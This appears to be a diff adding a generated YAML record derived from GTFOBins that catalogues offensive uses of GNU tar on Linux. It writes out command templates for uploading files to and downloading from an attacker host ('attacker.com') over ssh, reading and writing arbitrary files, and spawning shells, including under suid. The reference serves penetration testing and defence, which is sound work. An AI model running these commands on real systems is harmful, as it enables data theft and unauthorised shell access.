@@ -1,0 +1,129 @@
+id: gtfobins/tar/upload/unprivileged
+type: binary
+platform: linux
+name: tar
+phases:
+- exfiltration
+capabilities:
+- file-upload
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
+  comment: The attacker box must have the `rmt` utility installed.
+references:
+- https://gtfobins.github.io/gtfobins/tar/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        tar:
+          functions:
+            download:
+            - code: tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
+              comment: The attacker box must have the `rmt` utility installed.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: ssh-server
+              version: GNU
+            file-read:
+            - code: tar cf /dev/stdout /path/to/input-file -I 'tar xO'
+              comment: The file is read then passed to the specified command (e.g., `tar xO`) via standard
+                input.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              version: GNU
+            file-write:
+            - code: 'echo DATA >/path/to/temp-file
+
+                tar cf /path/to/temp-file.tar /path/to/temp-file
+
+                tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@'
+              comment: The archive can also be prepared offline then uploaded to the target.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              version: GNU
+            shell:
+            - code: tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
+              contexts:
+                sudo: null
+                suid:
+                  code: tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
+                  shell: false
+                unprivileged: null
+              version: GNU
+            - code: 'echo ''/bin/sh 0<&1'' >/path/to/temp-file
+
+                tar cf /path/to/temp-file.tar /path/to/temp-file
+
+                tar xf /path/to/temp-file.tar --to-command /bin/sh'
+              comment: The archive can also be prepared offline then uploaded to the target.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              version: GNU
+            upload:
+            - code: tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
+              comment: The attacker box must have the `rmt` utility installed.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: ssh-server
+              version: GNU
+    upstream_url: https://gtfobins.github.io/gtfobins/tar/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-upload
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: exfiltration
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:42bf6ffac6c7ae32f0296d0e7e6c31da2805209800c9dc41d9149d7f19f51433
